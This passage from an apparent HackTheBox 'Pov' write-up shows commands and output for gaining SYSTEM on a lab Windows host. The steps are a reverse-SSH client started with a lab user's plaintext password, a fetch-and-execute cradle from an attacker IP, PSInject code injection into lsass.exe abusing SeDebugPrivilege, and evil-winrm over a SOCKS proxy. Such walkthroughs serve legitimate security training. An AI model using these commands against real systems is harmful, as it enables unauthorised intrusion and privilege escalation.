PS C:\windows\system32\inetsrv> Invoke-RunasCs -Username "alaading" -Password "f8gQ8fynP44ek1m3" -Command "C:\programdata\client.exe"

2024/02/03 19:48:13 Forking

PS C:\windows\system32\inetsrv>
```

```bash
┌──(bravosec㉿fsociety)-[/opt/sectools/c2/reverse_ssh]
└─$ ssh 127.0.0.1 -p 443 ls -t
                            Targets
+------------------------------------------+--------------------------+
| IDs                                      | Version                  |
+------------------------------------------+--------------------------+
| 7566e46468a7599e7e6b4224c6ce6b03d000580c | SSH-v2.4.1-windows_amd64 |
| 4560e76350de6d8c31090d0eabcd9a9da8c8c58b |                          |
| pov.alaading.pov                         |                          |
| 10.129.230.183:49714                     |                          |
+------------------------------------------+--------------------------+
| d1a6b06b5bc4c4867f2aecad831d94f683331211 | SSH-v2.4.1-windows_amd64 |
| 4560e76350de6d8c31090d0eabcd9a9da8c8c58b |                          |
| pov.sfitz.pov                            |                          |
| 10.129.230.183:49713                     |                          |
+------------------------------------------+--------------------------+
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Pov]
└─$ ssh -J 127.0.0.1:443 pov.alaading.pov
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> whoami
pov\alaading
PS C:\Windows\system32> cat C:\Users\alaading\Desktop\user.txt
92c59b38efad758a3626f1132115ac6f
```

# Root Flag
---

## From alaading to SYSTEM


### Abuse privilege token

With `SeDebugPrivilege`, we can inspect and adjust the memory of other processes

```bash
PS C:\Windows\system32> whoami /all

USER INFORMATION
----------------

User Name    SID
============ =============================================
pov\alaading S-1-5-21-2506154456-4081221362-271687478-1001


GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes
==================================== ================ ============ ==================================================
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users      Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE             Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account           Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeDebugPrivilege              Debug programs                 Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

> https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens#rce

> The two methods from **hacktricks** doesn't work for this case, but migrating to process running by `NT AUTHORITY SYSTEM` with meterpreter works too
{: .prompt-tip }

Without meterpreter, I can use [Invoke-PSInject.ps1](https://github.com/EmpireProject/PSInject/blob/master/Invoke-PSInject.ps1) from **powershell empire**

![](/assets/obsidian/9af2e10d0ba980ed3ea208c48841917a.png)

Convert the command to start reverse ssh client to powershell base64 format

```bash
┌──(bravosec㉿fsociety)-[~/htb/Pov]
└─$ cat /tmp/x
Start-Process C:\programdata\client.exe

┌──(bravosec㉿fsociety)-[~/htb/Pov]
└─$ iconv -f ASCII -t UTF-16LE /tmp/x | base64 | tr -d "\n"
UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAEMAOgBcAHAAcgBvAGcAcgBhAG0AZABhAHQAYQBcAGMAbABpAGUAbgB0AC4AZQB4AGUACgA= 
```

Inject into `lsass.exe`

```bash
PS C:\Windows\system32> iex (new-object net.webclient).downloadstring("http://10.10.14.3:82/Invoke-PSInject.ps1");
PS C:\Windows\system32> Invoke-PSInject -ProcId (Get-WmiObject Win32_Process | ? { $_.Path -eq "C:\Windows\system32\lsass.exe" }).ProcessId
 -PoshCode UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAEMAOgBcAHAAcgBvAGcAcgBhAG0AZABhAHQAYQBcAGMAbABpAGUAbgB0AC4AZQB4AGUACgA= 
```

```bash
┌──(bravosec㉿fsociety)-[/opt/sectools/c2/reverse_ssh]
└─$ ssh 127.0.0.1 -p 443 ls -t
                            Targets
+------------------------------------------+--------------------------+
| IDs                                      | Version                  |
+------------------------------------------+--------------------------+
| 5ab575c072be7c2752de93d4d381c81de21df3e5 | SSH-v2.4.1-windows_amd64 |
| 4560e76350de6d8c31090d0eabcd9a9da8c8c58b |                          |
| nt.authority.system.pov                  |                          |
| 10.129.230.183:50690                     |                          |
+------------------------------------------+--------------------------+
| 7566e46468a7599e7e6b4224c6ce6b03d000580c | SSH-v2.4.1-windows_amd64 |
| 4560e76350de6d8c31090d0eabcd9a9da8c8c58b |                          |
| pov.alaading.pov                         |                          |
| 10.129.230.183:49714                     |                          |
+------------------------------------------+--------------------------+
| d1a6b06b5bc4c4867f2aecad831d94f683331211 | SSH-v2.4.1-windows_amd64 |
| 4560e76350de6d8c31090d0eabcd9a9da8c8c58b |                          |
| pov.sfitz.pov                            |                          |
| 10.129.230.183:49713                     |                          |
+------------------------------------------+--------------------------+
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Pov]
└─$ ssh -J 127.0.0.1:443 nt.authority.system.pov
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> whoami
nt authority\system
PS C:\Windows\system32> cat C:\Users\Administrator\Desktop\root.txt
57b4d8a06538fcd1c7379ef9457af188
```

# Additional
---

## Preserve privilege tokens

Two ways :

- RunasCS
- Winrm

### RunasCS

Needs to run `powershell` instead of `cmd.exe`, otherwise the token will be dropped

```bash
PS C:\Windows\system32> Invoke-RunasCs -Username "alaading" -Password "f8gQ8fynP44ek1m3" -Command "powershell whoami /priv"


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeDebugPrivilege              Debug programs                 Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

### Winrm

Open a socks5 proxy at port `1080`

```bash
ssh -J 127.0.0.1:443 pov.alaading.pov -D 1080
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Pov/exploit]
└─$ proxychains -q evil-winrm -i 127.0.0.1 -u 'alaading' -p 'f8gQ8fynP44ek1m3'

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\alaading\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeDebugPrivilege              Debug programs                 Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
*Evil-WinRM* PS C:\Users\alaading\Documents>
```

### Methods that won't work

```bash
PS C:\Windows\system32> Invoke-RunasCs -Username "alaading" -Password "f8gQ8fynP44ek1m3" -Command "cmd /c whoami /priv"


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeDebugPrivilege              Debug programs                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

```bash
$SecurePassword = ConvertTo-SecureString 'f8gQ8fynP44ek1m3' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('alaading', $SecurePassword)
$Session = New-PSSession -Credential $Cred
Invoke-Command -Session $session -scriptblock { whoami /priv }
```

```bash
runas.exe /user:alaading powershell.exe
```